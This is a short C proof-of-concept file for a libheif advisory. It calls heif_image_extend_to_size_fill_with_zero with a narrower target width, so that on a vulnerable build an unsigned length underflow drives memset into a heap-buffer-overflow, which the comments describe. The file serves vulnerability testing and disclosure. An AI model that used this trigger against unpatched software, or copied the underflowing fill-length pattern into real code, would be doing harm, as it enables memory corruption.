// PoC for GHSA-hqc2-cx5m-g6ff re-opened across two maintenance commits.
//
// Builds a plain monochrome image through the public libheif API and asks
// heif_image_extend_to_size_fill_with_zero() to grow it. The requested target
// (16 x 65) has at least as many samples as the 32 x 32 source, but it narrows
// the single Y plane from width 32 to width 16. On the fixed library this request
// is rejected safely; on the modified tree the per-row right-edge fill computes
// its length as (subsampled_width - old_width) = (16 - 32), which underflows
// uint32_t to ~4 billion, and the memset writes far past the end of the plane.
//
// Clean (returns an error) on the original maintenance batch; AddressSanitizer
// aborts with a heap-buffer-overflow on the modified tree.
#include <libheif/heif.h>
#include <stdio.h>

int main(void)
{
  heif_image* img = NULL;
  struct heif_error err;

  err = heif_image_create(32, 32, heif_colorspace_monochrome, heif_chroma_monochrome, &img);
  if (err.code != heif_error_Ok || img == NULL) {
    fprintf(stderr, "heif_image_create failed: %s\n", err.message ? err.message : "");
    return 2;
  }

  err = heif_image_add_plane(img, heif_channel_Y, 32, 32, 8);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_image_add_plane failed: %s\n", err.message ? err.message : "");
    heif_image_release(img);
    return 2;
  }

  err = heif_image_extend_to_size_fill_with_zero(img, 16, 65);
  fprintf(stderr, "extend_to_size returned code=%d subcode=%d (%s)\n",
          err.code, err.subcode, err.message ? err.message : "");

  heif_image_release(img);
  return 0;
}
